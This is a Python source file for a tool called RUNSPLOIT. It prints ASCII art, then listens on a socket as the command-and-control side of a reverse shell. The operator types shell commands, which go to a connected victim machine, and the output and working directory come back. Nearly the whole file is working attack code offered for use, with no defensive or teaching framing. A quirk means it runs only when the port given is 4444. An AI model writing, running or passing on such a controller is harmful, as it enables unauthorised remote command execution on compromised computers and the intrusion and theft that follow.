import socket, argparse
from os import system, name

parser = argparse.ArgumentParser()
parser.add_argument('-p', '--port', type=int, help='set your port [DEFAULT:4444]')
args = parser.parse_args()

class RUNSPLOIT:
    # This is just art for RUNSPLOIT
    def Art(self):
        print(r"""
                                ,--.
                               {    }
                               K,   }
                              /  ~Y`
                         ,   /   /
                        {_'-K.__/
                          `/-.__L._
                          /  ' /`\_}
                         /  ' /
                 ____   /  ' /
          ,-'~~~~    ~~/  ' /_
        ,'             ``~~~  ',
       (                        Y
      {                         I
     {                           `,
     |                            )
     |            ,..__      __. Y
     |           Y ' / ^Y   J   )|
     \           |' /   |   |   ||
      \          L_/    . _ (_,.'(
       \,   ,      ^^""' / |      )
         \_  \          /,L]     /    RUNSPLOIT
           '-_~-,       ` `   ./`
              `'{_            )
                  ^^\..___,.--`  
        
        """)

    # DO THIS SHIT!!!
    def Reverse_shell(self):
        # (DEFAULT:0.0.0.0)
        server = "0.0.0.0"
        port = args.port
        buffer = 1024 * 128 
        separator = "<sep>"
        s = socket.socket()
        s.bind((server, port))
        s.listen(5)
        print("[+]=========RUNSPLOIT HAS BEEN RUNNING========[+]")
        print(f"[+] Listening as {server}:{port} ...")
        client_socket, client_address = s.accept()
        print(f"[+] {client_address[0]}:{client_address[1]} Connected!")
        directory = client_socket.recv(buffer).decode()
        print(f"[+] Current working directory: {directory}")
        
        while True:
            try:
                command = input(f"[*] {directory}>>> ")
                if not command.strip() or command.lower() == "cd":
                    continue

                elif command.lower() == "exit" or command.lower() == "bye":
                    print("[!] DISCONNECTED")
                    break

                # this mean for clear screen on windows
                elif name == "nt" and command.lower() == "cls":
                    system('cls')

                # this mean for clear screen on mac and linux
                elif name == 'posix' and command.lower() == "clear":
                    system('clear')

                client_socket.send(command.encode())
                output = client_socket.recv(buffer).decode()
                results, directory = output.split(separator)
                print(results)    
                
            except ConnectionResetError:
                print("[!] Client has been disconnected!")
                break
                exit

    # this is main function
    def Main(self):
        if args.port == 4444:
            try:
                self.Art()
                self.Reverse_shell()
            except KeyboardInterrupt:
                print("Ctrl + C")

# RUN!!!
if __name__ == "__main__":
    RUN = RUNSPLOIT()
    RUN.Main()